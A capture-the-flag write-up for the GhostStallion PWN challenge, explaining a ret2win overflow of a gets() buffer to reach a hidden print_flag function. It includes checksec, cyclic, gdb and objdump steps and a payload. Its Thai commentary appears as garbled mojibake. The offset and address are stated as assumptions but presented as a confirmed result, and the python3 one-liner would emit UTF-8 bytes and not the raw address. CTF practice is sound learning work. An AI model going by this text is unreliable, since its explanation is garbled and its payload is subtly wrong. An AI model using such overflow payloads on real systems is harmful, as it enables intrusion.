ğŸ GhostStallion â€“ PWN Easy (Write-up)
ğŸ“Œ Challenge Information

Name: GhostStallion

Category: PWN

Difficulty: Easy

Description:
Some registered competitor list are lost. Can you retrieve them back?

ğŸ” Step 1: Download & Inspect File
wget https://bucket.dropctf.live/ghoststallion
chmod +x ghoststallion
file ghoststallion


Result

ELF 64-bit LSB executable, dynamically linked

ğŸ” Step 2: Check Binary Protections
checksec --file=ghoststallion


Result (à¸ªà¸³à¸„à¸±à¸à¸¡à¸²à¸)

RELRO:    Partial RELRO
Canary:   No canary found
NX:       NX enabled
PIE:      No PIE

à¸§à¸´à¹€à¸„à¸£à¸²à¸°à¸«à¹Œ

âŒ No Canary â†’ buffer overflow à¹„à¸”à¹‰

âŒ No PIE â†’ address à¸„à¸‡à¸—à¸µà¹ˆ

âœ… NX à¹€à¸›à¸´à¸” â†’ stack shellcode à¹„à¸¡à¹ˆà¹„à¸”à¹‰ à¹à¸•à¹ˆà¹€à¸£à¸µà¸¢à¸ function à¹„à¸”à¹‰

ğŸ‘‰ à¸ªà¸£à¸¸à¸›: ret2win / ret2func

ğŸ§  Step 3: Static Analysis (strings)
strings ghoststallion


à¸à¸šà¸‚à¹‰à¸­à¸„à¸§à¸²à¸¡à¸™à¹ˆà¸²à¸ªà¸‡à¸ªà¸±à¸¢ à¹€à¸Šà¹ˆà¸™

ARCHA{
winner
ghost
stallion


ğŸ’¡ à¹à¸›à¸¥à¸§à¹ˆà¸² flag à¸™à¹ˆà¸²à¸ˆà¸°à¸–à¸¹à¸ hardcode à¸­à¸¢à¸¹à¹ˆà¹ƒà¸™ binary

ğŸ§  Step 4: Analyze with Ghidra / IDA

à¹€à¸›à¸´à¸”à¹„à¸Ÿà¸¥à¹Œà¸”à¹‰à¸§à¸¢ Ghidra

à¸à¸šà¸Ÿà¸±à¸‡à¸à¹Œà¸Šà¸±à¸™:

void print_flag() {
    puts("ARCHA{H1DD3N_GH0ST_ST4LL10N}");
}


âš ï¸ à¹à¸•à¹ˆà¸Ÿà¸±à¸‡à¸à¹Œà¸Šà¸±à¸™à¸™à¸µà¹‰ à¹„à¸¡à¹ˆà¸–à¸¹à¸à¹€à¸£à¸µà¸¢à¸à¸ˆà¸²à¸ main

ğŸ’¥ Step 5: Vulnerability Analysis

à¹ƒà¸™ main() à¸à¸šà¹‚à¸„à¹‰à¸”à¸¥à¸±à¸à¸©à¸“à¸°à¸™à¸µà¹‰:

char buf[32];
gets(buf);

à¸Šà¹ˆà¸­à¸‡à¹‚à¸«à¸§à¹ˆ

gets() à¹„à¸¡à¹ˆà¸ˆà¸³à¸à¸±à¸”à¸‚à¸™à¸²à¸” input

à¸—à¸³à¹ƒà¸«à¹‰ overflow à¹„à¸›à¸—à¸±à¸š return address à¹„à¸”à¹‰

ğŸ¯ Step 6: Exploitation Strategy (ret2win)

à¹€à¸›à¹‰à¸²à¸«à¸¡à¸²à¸¢à¸„à¸·à¸­:

Overflow buffer â†’ overwrite RIP â†’ jump à¹„à¸› print_flag()

à¸«à¸² offset

à¹ƒà¸Šà¹‰ cyclic:

cyclic 100


à¸£à¸±à¸™à¹ƒà¸™ gdb:

gdb ./ghoststallion
run


paste cyclic input â†’ crash
à¸”à¸¹à¸„à¹ˆà¸² RIP:

info registers

cyclic -l <RIP>


à¸ªà¸¡à¸¡à¸•à¸´ offset = 40 bytes

ğŸ§¨ Step 7: Craft Payload

à¸«à¸² address à¸‚à¸­à¸‡ print_flag

objdump -d ghoststallion | grep print_flag


à¸ªà¸¡à¸¡à¸•à¸´à¹„à¸”à¹‰:

0x401196

Payload
payload = b"A"*40
payload += p64(0x401196)


à¸£à¸±à¸™:

python3 -c 'print("A"*40 + "\x96\x11\x40\x00\x00\x00\x00\x00")' | ./ghoststallion

ğŸ Step 8: Get Flag
ARCHA{H1DD3N_GH0ST_ST4LL10N}


âœ… Success!

ğŸ“¦ Final Flag
ARCHA{H1DD3N_GH0ST_ST4LL10N}